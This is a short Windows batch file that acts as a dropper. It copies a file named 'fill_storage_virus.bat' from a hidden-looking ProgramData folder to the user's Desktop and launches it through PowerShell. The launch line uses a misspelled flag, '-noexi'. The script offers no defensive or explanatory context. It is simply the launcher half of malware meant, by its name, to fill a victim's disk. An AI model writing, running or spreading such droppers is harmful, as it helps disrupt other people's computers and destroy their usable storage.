@echo off
cd C:\ProgramData\Ms
copy fill_storage_virus.bat C:\Users\%USERNAME%\Desktop
cd C:\Users\%USERNAME%\Desktop
powershell.exe -noexi "fill_storage_virus.bat"
exit
